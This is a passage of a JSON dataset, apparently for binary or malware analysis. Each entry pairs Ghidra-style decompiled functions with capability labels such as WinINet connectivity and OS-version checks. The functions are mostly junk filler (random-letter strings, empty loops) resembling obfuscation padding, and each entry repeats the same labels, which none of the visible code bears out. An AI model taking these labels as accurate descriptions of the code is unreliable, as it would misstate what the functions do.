        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401baa)\n\nuint fcn.00401b7c(void)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    return 0x181;\n}\n",
        "token_count": 57
    },
    "00401d56": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00401d56(uint noname_0, uint noname_1, uint noname_2, uint arg_14h, uint arg_18h, uint noname_5, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_3ch;\n    uint var_34h;\n    uchar var_1ah;\n    uint var_19h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    stack0xffffffe4 = *0x519278;\n    var_19h._0_1_ = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"shmhphenjzahbztqkdccrmywgyxsbjkcypeyivwzswmfunqtvkjeskwifagbfcghxdylpvljmj\", &var_1ah);\n    fcn.00483140();\n    for (var_ch = 0x47; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x17; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.004b2800();\n    return 0x79b7;\n}\n",
        "token_count": 358
    },
    "00401e0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.00401e0c(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint noname_9, uint arg_30h)\n\n{\n    char cVar1;\n    uint in_ECX;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_94h;\n    uint var_7ch;\n    uint var_62h;\n    uint var_45h;\n    uint var_2ah;\n    uchar var_1dh;\n    uint var_1ch;\n    uchar var_15h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"bxcuorkbtbbympd\", &var_62h);\n    fcn.00483140();\n    var_14h = 0x1347;\n    var_15h = 1;\n    var_1ch = 0xb62;\n    var_1dh = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"cwmuiwcjecizzicoqtdhramupvnoqowkaycuxmtqvfolhfsmnrrsjtxoujhrjybcokwkabqlhqzafrzqyjywtj\", &var_62h + 1)\n    ;\n    fcn.00483140();\n    stack0xffffffd4 = *0x519280;\n    fcn.00483110();\n    fcn.004b21e0(\"cwmuiwcjecizzicoqtdhramupvnoqowkaycuxmtqvfolhfsmnrrsjtxoujhrjybcokwkabqlhqzafrzqyjywtj\", &var_45h);\n    fcn.00483110();\n    fcn.004b21e0(\"cwmuiwcjecizzicoqtdhramupvnoqowkaycuxmtqvfolhfsmnrrsjtxoujhrjybcokwkabqlhqzafrzqyjywtj\", &var_2ah);\n    cVar1 = fcn.004c1070(&var_45h + 1, &var_62h + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x20; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 0x5f; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"ubapbs\", &var_2ah + 1);\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 803
    },
    "00402072": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00402072(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h, uint arg_34h)\n\n{\n    char cVar1;\n    uint in_ECX;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_a0h;\n    uint var_88h;\n    uint var_6fh;\n    uint var_51h;\n    uchar var_36h;\n    uchar var_35h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_21h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"nebgxscprcbnuhieycmovxzveuwkqqgsiowjjdlapclapsxpwbrnksvejmzelotqweghkovgowxkgtvzjo\", &var_6fh);\n    fcn.00483140();\n    stack0xffffffdc = *0x519288;\n    fcn.00483110();\n    fcn.004b21e0(\"xsneqyqpa\", &var_6fh + 1);\n    fcn.00483140();\n    var_21h._0_1_ = 0;\n    var_28h = 0xe4a;\n    fcn.00483110();\n    fcn.004b21e0(\"rcabudorltzkemescmig\", &var_6fh + 2);\n    fcn.00483140();\n    var_2ch = 0x52c;\n    var_30h = 0xc3;\n    var_34h = 0x50d;\n    for (var_ch = 0x5c; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"xsneqyqpa\", &var_51h);\n    fcn.00483110();\n    fcn.004b21e0(\"xsneqyqpa\", &var_36h);\n    cVar1 = fcn.004c1070(&var_51h + 1, &var_6fh + 3);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x5a; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    for (var_14h = 5; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"pzsnacwvcvicjpkrk\", &var_35h);\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 870
    },
    "004028f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl\nfcn.004028f8(uint noname_0, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a4h;\n    uint var_8ch;\n    uint var_72h;\n    uint var_55h;\n    uint var_39h;\n    uchar var_29h;\n    uint var_28h;\n    uchar var_22h;\n    uint var_21h;\n    ulong uStack28;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack28 = *0x5192a8;\n    fcn.00483110();\n    fcn.004b21e0(\"ddcuqatmoadongxrzpzygdtqorulxbvjcdbwuayuqsvfgakvavmik\", &var_72h);\n    fcn.00483140();\n    stack0xffffffdc = *0x5192b0;\n    var_21h._0_1_ = 1;\n    var_22h = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"mtniuxibclkaitbc\", &var_72h + 1);\n    fcn.00483140();\n    var_28h = 0x1fed;\n    var_29h = 1;\n    stack0xffffffc4 = *0x5192b8;\n    fcn.00483110();\n    fcn.004b21e0(\"mtniuxibclkaitbc\", &var_55h);\n    fcn.00483110();\n    fcn.004b21e0(\"mtniuxibclkaitbc\", &var_39h);\n    cVar2 = fcn.004c09a0(&var_55h + 1, &var_72h + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x5192c0;\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x59; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 0x15; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 667
    },
    "00402c30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00402c30(uint noname_0, uint noname_1, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    char cVar1;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_9ch;\n    uint var_94h;\n    uint var_7ch;\n    uint var_62h;\n    uint var_45h;\n    uchar var_29h;\n    uint var_28h;\n    uchar var_22h;\n    uint var_21h;\n    uchar var_11h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0xfc;\n    fcn.00483110();\n    fcn.004b21e0(\"ibzdswhcuchaeckmitpaiehydymvolyrservpgsvgicttkxycdt\", &var_62h);\n    fcn.00483140();\n    var_11h = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"gtxntjjrvjtfhosc\", &var_62h + 1);\n    fcn.00483140();\n    stack0xffffffdc = *0x5192d0;\n    var_21h._0_1_ = 1;\n    var_22h = 0;\n    var_28h = 0x1cb;\n    fcn.00483110();\n    fcn.004b21e0(\"ibzdswhcuchaeckmitpaiehydymvolyrservpgsvgicttkxycdt\", &var_45h);\n    fcn.00483110();\n    fcn.004b21e0(\"ibzdswhcuchaeckmitpaiehydymvolyrservpgsvgicttkxycdt\", &var_29h);\n    cVar1 = fcn.004c1070(&var_45h + 1, &var_62h + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x52; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 634
    },
    "00402e22": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl fcn.00402e22(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a0h;\n    uint var_88h;\n    uint var_6eh;\n    uint var_51h;\n    uchar var_35h;\n    uint var_34h;\n    ulong uStack52;\n    uchar var_21h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0x711;\n    var_14h = 0x1337;\n    fcn.00483110();\n    fcn.004b21e0(\"auhazoqvynmhtxmyzolrebaztttmjbkgyppbiyjhutpozckbekbwxdqeshbwoxloeaqcgxvdhhxwmlpvfusrfalqocwbpxzm\", \n                 &var_6eh);\n    fcn.00483140();\n    var_18h = 0xa8f;\n    var_1ch = 0x3bf;\n    var_20h = 0x14b;\n    fcn.00483110();\n    fcn.004b21e0(\"vqjtupnrpjtfzuksgujvjotifkqawjuomtbaaheocmtwvutsdnodcqxnbakbedrxcmcalascny\", &var_6eh + 1);\n    fcn.00483140();\n    var_21h = 1;\n    uStack52 = *0x5192d8;\n    var_34h = 0xaec;\n    fcn.00483110();\n    fcn.004b21e0(\"vqjtupnrpjtfzuksgujvjotifkqawjuomtbaaheocmtwvutsdnodcqxnbakbedrxcmcalascny\", &var_51h);\n    fcn.00483110();\n    fcn.004b21e0(\"vqjtupnrpjtfzuksgujvjotifkqawjuomtbaaheocmtwvutsdnodcqxnbakbedrxcmcalascny\", &var_35h);\n    cVar1 = fcn.004c09a0(&var_51h + 1, &var_6eh + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x54; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0xdbc0;\n}\n",
        "token_count": 704
    },
    "0040398a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl fcn.0040398a(uint arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_44h;\n    uint var_2bh;\n    uint var_1ch;\n    ulong uStack28;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0x752;\n    uStack28 = *0x5193d0;\n    var_1ch = 0xe13;\n    stack0xffffffd4 = *0x5193d8;\n    fcn.00483110();\n    fcn.004b21e0(\"orwmmnsmnoniksbngrwxtshysanjowaqnxongknzsoimovjyelzbgvohszejtwh\", &var_2bh);\n    fcn.00483140();\n    var_2bh._2_1_ = 0;\n    var_2bh._1_1_ = 0;\n    for (var_ch = 0xf; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 306
    },
    "00403a3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00403a3c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint arg_2ch, uint arg_30h, uint arg_34h)\n\n{\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_10h;\n    int32_t var_ch;\n    \n    for (var_ch = 0x11; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "00403ba8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403ba8(uint noname_0, uint noname_1, uint noname_2, uint arg_14h)\n\n{\n    uint var_18h;\n    uint var_14h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x5c; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    for (var_8h = 0xf; 0 < var_8h; var_8h = var_8h + -1) {\n    }\n    return 0;\n}\n",
        "token_count": 149
    },
    "00403bf2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __fastcall fcn.00403bf2(uint param_1)\n\n{\n    char cVar1;\n    uint var_11ch;\n    uint var_114h;\n    uint var_f9h;\n    uint var_ddh;\n    uint var_c1h;\n    uint var_a5h;\n    uint var_89h;\n    uint var_6dh;\n    uint var_51h;\n    uint var_35h;\n    int32_t var_1ah;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"ekfpnwbqgqfjgzvxjlqfhgfazlpnhgdxsbxishrklqmcricnqyplujqdwrjgmzvdfqruojfpxmjctxupoateqdtxzdlnzyulp\", \n                 &var_f9h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ekfpnwbqgqfjgzvxjlqfhgfazlpnhgdxsbxishrklqmcricnqyplujqdwrjgmzvdfqruojfpxmjctxupoateqdtxzdlnzyulp\", \n                 &var_ddh);\n    fcn.00483110();\n    fcn.004b21e0(\"ekfpnwbqgqfjgzvxjlqfhgfazlpnhgdxsbxishrklqmcricnqyplujqdwrjgmzvdfqruojfpxmjctxupoateqdtxzdlnzyulp\", \n                 &var_c1h);\n    cVar1 = fcn.004c1070(&var_ddh + 1, &var_f9h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x45; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"ekfpnwbqgqfjgzvxjlqfhgfazlpnhgdxsbxishrklqmcricnqyplujqdwrjgmzvdfqruojfpxmjctxupoateqdtxzdlnzyulp\", \n                 &var_a5h);\n    fcn.00483110();\n    fcn.004b21e0(\"ekfpnwbqgqfjgzvxjlqfhgfazlpnhgdxsbxishrklqmcricnqyplujqdwrjgmzvdfqruojfpxmjctxupoateqdtxzdlnzyulp\", \n                 &var_89h);\n    cVar1 = fcn.004c09a0(&var_a5h + 1, &var_c1h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0xb; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"ekfpnwbqgqfjgzvxjlqfhgfazlpnhgdxsbxishrklqmcricnqyplujqdwrjgmzvdfqruojfpxmjctxupoateqdtxzdlnzyulp\", \n                 &var_6dh);\n    fcn.00483110();\n    fcn.004b21e0(\"ekfpnwbqgqfjgzvxjlqfhgfazlpnhgdxsbxishrklqmcricnqyplujqdwrjgmzvdfqruojfpxmjctxupoateqdtxzdlnzyulp\", \n                 &var_51h);\n    cVar1 = fcn.004c09a0(&var_6dh + 1, &var_89h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_14h = 0x18; 0 < var_14h; var_14h = var_14h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"ekfpnwbqgqfjgzvxjlqfhgfazlpnhgdxsbxishrklqmcricnqyplujqdwrjgmzvdfqruojfpxmjctxupoateqdtxzdlnzyulp\", \n                 &var_35h);\n    fcn.00483110();\n    fcn.004b21e0(\"ekfpnwbqgqfjgzvxjlqfhgfazlpnhgdxsbxishrklqmcricnqyplujqdwrjgmzvdfqruojfpxmjctxupoateqdtxzdlnzyulp\", \n                 &var_1ah);\n    cVar1 = fcn.004c09a0(&var_35h + 1, &var_51h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xffffffe4 = 0; 0 < stack0xffffffe4; unique0x00007a80 = stack0xffffffe4 + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"zltypggkglunxigtwbh\", &var_1ah + 1);\n    fcn.00483140();\n    fcn.004b2800();\n    return param_1;\n}\n",
        "token_count": 1412
    },
    "0040406a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.0040406a(uint noname_0, uint arg_ch)\n\n{\n    char cVar1;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a4h;\n    uint var_8ch;\n    uint var_72h;\n    uint var_55h;\n    uint var_39h;\n    uint var_2ch;\n    uchar var_25h;\n    uint var_24h;\n    ulong uStack36;\n    ulong uStack28;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"hrhpoptutekcaqwbfimnrflhrhargjdzrcmpp\", &var_72h);\n    fcn.00483140();\n    uStack28 = *0x5193f8;\n    uStack36 = *0x519400;\n    var_24h = 0x43e;\n    var_25h = 0;\n    var_2ch = 0xa82;\n    fcn.00483110();\n    fcn.004b21e0(\"iqhvswhndwldxjcmvukpwdaxznqariubidhjcdjodifdrgfkkzubemepb\", &var_72h + 1);\n    fcn.00483140();\n    stack0xffffffc4 = *0x519408;\n    fcn.00483110();\n    fcn.004b21e0(\"iqhvswhndwldxjcmvukpwdaxznqariubidhjcdjodifdrgfkkzubemepb\", &var_55h);\n    fcn.00483110();\n    fcn.004b21e0(\"iqhvswhndwldxjcmvukpwdaxznqariubidhjcdjodifdrgfkkzubemepb\", &var_39h);\n    cVar1 = fcn.004c09a0(&var_55h + 1, &var_72h + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x41; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 579
    },
    "004042ce": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.004042ce(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_158h;\n    uint var_154h;\n    uint var_14ch;\n    uint var_144h;\n    uint var_12ch;\n    uint var_114h;\n    uint var_fch;\n    uint var_e4h;\n    uchar var_e0h [27];\n    uint var_c5h;\n    uint var_a9h;\n    uint var_8dh;\n    uint var_71h;\n    uint var_55h;\n    uchar var_39h;\n    uint var_38h;\n    uchar var_31h;\n    uint var_30h;\n    uint var_29h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"sggeampdxkpoxhfrlkbtbwdsdyhkvo\", &var_e4h);\n    fcn.00483140();\n    var_1ch = 0x392;\n    stack0xffffffd4 = *0x519428;\n    fcn.00483110();\n    fcn.004b21e0(\"tnytcuzdfwcfwihsbcemjpifozbtakmphebiiagmqofotofcaaakejaxpxtpfcgunrnjz\", &var_e4h + 1);\n    fcn.00483140();\n    var_29h._0_1_ = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"zgljihumyzsbqwgvziiqdcdvkyzfbgrcktpzjhngleofnbdxdjgzkereoazgygpfeozkiubqhowwpifl\", &var_e4h + 2);\n    fcn.00483140();\n    var_30h = 0x6cd;\n    var_31h = 1;\n    var_38h = 0x200;\n    fcn.00483110();\n    fcn.004b21e0(\"favbzqbtjqnioslyiubzrlxauhuwxspapamvcyluzizvoodp\", &var_e4h + 3);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"favbzqbtjqnioslyiubzrlxauhuwxspapamvcyluzizvoodp\", &var_c5h);\n    fcn.00483110();\n    fcn.004b21e0(\"favbzqbtjqnioslyiubzrlxauhuwxspapamvcyluzizvoodp\", &var_a9h);\n    cVar2 = fcn.004c09a0(&var_c5h + 1, var_e0h);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x38; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 0x15; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"tnytcuzdfwcfwihsbcemjpifozbtakmphebiiagmqofotofcaaakejaxpxtpfcgunrnjz\", &var_8dh);\n    fcn.00483110();\n    fcn.004b21e0(\"tnytcuzdfwcfwihsbcemjpifozbtakmphebiiagmqofotofcaaakejaxpxtpfcgunrnjz\", &var_71h);\n    cVar2 = fcn.004c1070(&var_8dh + 1, &var_a9h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar2 != '\\0') {\n        for (var_14h = 0x4d; 0 < var_14h; var_14h = var_14h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"tnytcuzdfwcfwihsbcemjpifozbtakmphebiiagmqofotofcaaakejaxpxtpfcgunrnjz\", &var_55h);\n    fcn.00483110();\n    fcn.004b21e0(\"tnytcuzdfwcfwihsbcemjpifozbtakmphebiiagmqofotofcaaakejaxpxtpfcgunrnjz\", &var_39h);\n    cVar2 = fcn.004c1070(&var_55h + 1, &var_71h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x519430;\n    if (cVar2 != '\\0') {\n        for (var_18h = 0x56; 0 < var_18h; var_18h = var_18h + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 1346
    },
    "00404794": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.00404794(void)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_ach;\n    uint var_a4h;\n    uint var_8ch;\n    uint var_74h;\n    uint var_5bh;\n    uint var_3dh;\n    uchar var_22h;\n    uint var_21h;\n    uchar var_16h;\n    uchar var_15h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_14h = 0x19ff;\n    var_15h = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"whjv\", &var_5bh);\n    fcn.00483140();\n    var_16h = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"cnjadhcpfcnlqqzupzrxeroaqdtkxtaaydnklpjbymowqfwtngrtprvdyemafqykiukbofggzggqfohhbmxbkakdwlrrasor\", \n                 &var_5bh + 1);\n    fcn.00483140();\n    stack0xffffffdc = *0x519438;\n    var_21h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"azdivpnrz\", &var_5bh + 2);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"azdivpnrz\", &var_3dh);\n    fcn.00483110();\n    fcn.004b21e0(\"azdivpnrz\", &var_22h);\n    cVar2 = fcn.004c09a0(&var_3dh + 1, &var_5bh + 3);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x519440;\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x37; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 0x1c; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 627
    },
    "004049cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
